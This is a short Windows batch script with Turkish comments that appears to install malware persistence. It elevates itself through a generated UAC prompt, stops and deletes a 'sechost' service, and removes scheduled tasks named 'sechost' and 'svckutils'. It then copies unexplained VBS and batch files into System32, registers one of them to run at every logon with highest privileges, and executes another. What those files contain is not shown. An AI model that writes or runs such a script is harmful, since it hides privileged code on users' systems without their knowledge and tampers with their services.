@echo off
setlocal enabledelayedexpansion

:: Yönetici yetkisi kontrolü
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC=CreateObject^("Shell.Application"^)>"%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe","/c ""%~s0""","","runas",1>>"%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: Yönetici grubunu kontrol et
whoami /groups | find "Administrators" > nul
if %errorLevel% neq 0 (
    echo Kullanıcı yönetici grubu üyesi değil.
    exit /b 1
)

:: Komut 1: sechost servisinin durdurulması
sc stop sechost

:: Komut 2: sechost servisinin silinmesi
sc delete sechost

:: Komut 3: sechost görevini silme
schtasks /delete /tn "sechost" /f

:: Komut 4: svckutils görevini silme
schtasks /delete /tn "svckutils" /f

schtasks /create /tn "cvbs" /tr "C:\Windows\system32\c.vbs" /sc ONLOGON /rl HIGHEST /f

:: Dosya kopyalamaları
if exist "%~dp0b.vbs" (
    copy /y "%~dp0b.vbs" "%SystemRoot%\System32\b.vbs"
)

:: Dosya kopyalamaları
if exist "%~dp0c.vbs" (
    copy /y "%~dp0c.vbs" "%SystemRoot%\System32\c.vbs"
)
:: Dosya kopyalamaları
if exist "%~dp0adamsatmayiz.bat" (
    copy /y "%~dp0adamsatmayiz.bat" "%SystemRoot%\System32\adamsatmayiz.bat"
)

:: VBS dosyasının çalıştırılması
if exist "%SystemRoot%\System32\b.vbs" (
    cscript "%SystemRoot%\System32\b.vbs"
)

exit
